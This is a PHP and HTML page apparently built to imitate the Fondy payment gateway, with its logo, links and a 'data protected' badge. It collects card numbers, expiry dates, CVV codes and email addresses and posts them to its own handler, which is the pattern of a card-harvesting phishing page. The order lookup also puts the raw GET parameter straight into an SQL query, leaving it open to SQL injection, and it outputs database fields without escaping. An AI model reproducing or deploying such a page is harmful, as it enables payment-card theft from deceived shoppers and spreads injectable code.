<?php
    require_once("inc/connect.php");

    $order = $_GET["order"];
    $result = mysqli_query($connect, "SELECT * FROM payments WHERE order_id='$order'");
    $count = mysqli_num_rows($result);

    if ($count < 1) {
        header("Location: 404.php");
    }

    $row = mysqli_fetch_assoc($result);
    $company_name = $row["company_name"];
    $company_link = $row["company_link"];
    $order_description = $row["order_description"];
    $price = $row["price"];
?>

<!DOCTYPE html>
<html lang="ua">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Foundy payment gateway</title>
    <script src="https://unpkg.com/blickcss"></script>
    <link rel="stylesheet" href="assets/css/style.css?t=<?php time() ?>">
    <style> 
      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
      :root{
        --font-main:inter;
        --gray:#bac1ca; 
        --gray-1:#818c99;
        --gray-dark:#3d3d3d;
      }
    </style>
  </head>
  <body class="bg-#E5E8EB flex flex-center min-h-screen">
    <div class="w-full min-h-screen lg:w-1140 lg:h-95vh  bg-white r-16 shw1 flex m-lg:ai-c m-lg:py-40 m-lg:gap-20 m-md:flex-col">
      <div class="w-360 lg:w-730 h-full lg:br-2 bc-#eee lg:p-35+60 flex flex-col gap-40">
        <a href="https://fondy.ua/ru/" target="_blank">
          <img src="assets/img/logo.svg" alt="">
        </a>
        <div>
          <div>
            <p class="c-$gray fw-500"><?php echo $company_name; ?></p>
            <a class="h:td-underline c-$gray mb-12 block" href="<?php echo $company_link; ?>" target="_blank"><?php echo $company_link; ?></a>
          </div>
          <p class="c-$gray-1 mb-10">Order for <?php echo $order_description; ?></p>
          <div class="c-$gray-dark mb-30">
            <b class="fs-2rem">
              <?php echo number_format($price, 0, '.', ' '); ?>,
              <sup class="fs-1rem">00</sup>
            </b>
            <span class="c-$gray fs-1.375rem">₴</span>
          </div>
          <button class="flex flex-space w-full p-10 r-8 bg-#F2F3F5 pointer f:outline-5+solid+$gray">
            <div class="flex ai-c">
              <img src="assets/img/card-icon.svg" alt="card"> 
              <span>Банковская карта</span>
            </div>
            <img src="assets/img/methods.svg" alt="methods">
          </button>
        </div>
      </div>
      <div class="w-full h-full flex m-lg:flex-col m-lg:gap-40 flex-center rel">
        <div class="w-360">
          <form method="post" action="inc/pay.php">

            <div class="card_black c-f">
              <div class="flex flex-col gap-3 rel">
                <p>НОМЕР КАРТЫ</p>
                <input required type="text" id="card_number" name="card_number">
                <span id="card_number_ph" class="abs">____ ____ ____ ____</span>
              </div>
              <div class="flex gap-10">
                <div class="flex flex-col gap-3 w-80 rel">
                  <p>ММ/ГГ</p>
                  <input required id="card_data" type="text" name="expiry_date">
                  <span id="card_data_ph" class="abs">__/__</span>
                </div>
                <div class="flex flex-col gap-3 rel">
                  <p>CVV2/CVC2</p>
                  <label class="abs bottom-0 c-f" id="cvv_code"></label>
                  <input required class="c-tp!" id="card_cvv" type="text" name="cvv2">
                  <span id="card_cvv_ph" class="abs">___</span>
                </div>
              </div>
            </div>

            <div class="">
              <input required type="email" name="email" id="email_input" class="b-1 r-8 bc-#d5dae0 p-20+10 w-full mb-16 mt-24" placeholder="Электронная почта">

              <button type="submit" id="pay_btn" class="btn_green-f w-full fs-18 f:outline-5+solid+$gray">
                Оплатить &nbsp;<b><?php echo number_format($price, 0, '.', ' '); ?>,00</b> ₴
              </button>
            </div>

            <style>
              #email_input::placeholder {
                color:#9ca7b3
              }
              #email_input:hover::placeholder {
                color:#818c99
              }
            </style>

            

          </form>

          
        </div>
        <a href="https://fondy.ua/ru/legal/" class="lg:abs right-24 bottom-20 flex gap-5 c-gray ai-c fs-12 lg:fs-8" target="_blank">
          <img src="assets/img/guard.svg?t=122">
          <span>Данные <br class="m-md:hide"> покупателя <br class="m-md:hide"> защищены</span>
        </a>
        
      </div>
    </div>





    <script src="assets/js/script.js?t=<?php time() ?>"></script>
  </body>
</html>



